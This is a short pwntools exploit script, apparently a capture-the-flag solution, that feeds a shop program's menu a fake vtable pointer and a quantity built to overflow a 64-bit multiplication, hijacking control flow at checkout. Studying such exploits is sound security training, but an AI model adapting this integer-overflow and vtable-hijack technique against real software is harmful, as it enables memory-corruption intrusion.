from pwn import *

# Create item
print('1')
FUNC = 0x701e40
#FUNC = 0x41414141 + 0x18
vtable_ptr = FUNC-0x18
print(p64(vtable_ptr) * 8)  # name - pointer to fake vtable
print('bob')    # description
print('1.23')   # price 

# Add item to basket
print('4')
print('1')  # second item, added above
print('288230376151711745') # quantity - (2**64 / 64) + 1

# Check out
print('6')
